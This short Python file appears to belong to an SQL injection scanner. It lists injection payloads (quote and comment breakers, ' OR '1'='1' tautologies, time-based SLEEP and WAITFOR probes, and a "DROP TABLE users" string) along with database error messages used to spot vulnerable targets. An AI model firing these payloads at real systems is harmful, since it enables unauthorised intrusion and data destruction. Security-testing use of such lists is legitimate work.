import random

payloads_quotes = ["\"","'"]

payloads_comments = [
    "--",
    "-- -",
    "#",
    ";"
]

BlindTrue = [
    "AND 1=1",
]

BlindFalse = [
    "AND 1=2"
]

boolean_based_payloads = [
        "' OR '1'='1'",
        "' OR '1'='1' --",
        "'; DROP TABLE users; --"
    ]



time_based_payloads = [
    "SELECT SLEEP(2)",          # MySQL
    "SELECT PG_SLEEP(2)",       # PostGreSQL
    "WAITFOR DELAY '00:00:01'", # MSSQL
    "sqlite3_sleep(2000)"       # SQLite3
]

errors_msgs = [
    # ======== SQLite3 ========
    "<b>Warning</b>:  SQLite3",
    "unrecognized token:",
    "Unable to prepare statement:",
    # ======== MySQL =========
    "You have an error in your SQL",
    "MySQL server version for the right syntax",
    "supplied argument is not a valid MySQL result resource",
    # ======== PostgreSQL ========
    "ERROR:  syntax error"
]

